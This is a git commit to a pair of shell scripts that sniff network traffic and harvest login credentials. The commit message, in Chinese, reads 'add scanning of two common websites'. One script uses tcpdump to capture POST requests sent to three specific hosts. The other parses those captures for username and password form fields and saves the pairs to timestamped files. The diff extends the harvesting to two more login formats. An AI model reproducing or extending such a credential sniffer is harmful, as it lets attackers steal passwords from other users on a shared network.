0638204789548a98d5cc6731cba939494972ea6f
ILoveDongyuan <876008816@qq.com>
2018-06-25 17:39:40 +0800

    添加两个常用网站的扫描

--- data_fetch.sh
+++ data_fetch.sh
@@ -1,6 +1,11 @@
 #!/bin/bash 
+datafile=`date "+%Y%m%d_%H-%M-%S"`
+datafile=$datafile".txt"
 filepath="/home/sysinfo/ylzplan"
 filename=`ls $filepath/temp/ | sort -r | sed -n '1p'`
-cat $filepath/temp/$filename | sed -n '/userName/p' | awk 'BEGIN{FS="userName="} {print $2}' | awk 'BEGIN{FS="&userPass="} {print $1,$2}' | awk 'BEGIN{FS="&x="} {print $1}' > $filepath/.tmp
-sort -u $filepath/.tmp >> $filepath/test.txt
+cat $filepath/temp/$filename | sed -n '/userPass/p'  | awk 'BEGIN{FS="userName="} {print $2}' | awk 'BEGIN{FS="&userPass="} {print $1,$2}'  | awk 'BEGIN{FS="&x="} {print $1}'      > $filepath/.tmp
+cat $filepath/temp/$filename | sed -n '/DDDDD=/p'    | awk 'BEGIN{FS="DDDDD="} {print $2}'    | awk 'BEGIN{FS="&upass="} {print $1,$2}'     | awk 'BEGIN{FS="&0MKKey="} {print $1}' >> $filepath/.tmp
+cat $filepath/temp/$filename | sed -n '/username=/p' | awk 'BEGIN{FS="username="} {print $2}' | awk 'BEGIN{FS="&password="} {print $1,$2}'  | awk 'BEGIN{FS="&lt="} {print $1}'     >> $filepath/.tmp
+
+sort -u $filepath/.tmp > $filepath/$datafile 
 rm $filepath/.tmp
--- packet_analysis.sh
+++ packet_analysis.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 datafile=`date "+%Y%m%d_%H-%M-%S"`
 datafile=$datafile".tmp"
-tcpdump -i $1 -v host 219.217.20.123 and tcp[32:2]=0x504f > /home/sysinfo/ylzplan/temp/$datafile
+tcpdump -i $1 -v host 219.217.20.123 or host 172.16.6.3 or host 202.198.192.45 and tcp[32:2]=0x504f > /home/sysinfo/ylzplan/temp/$datafile
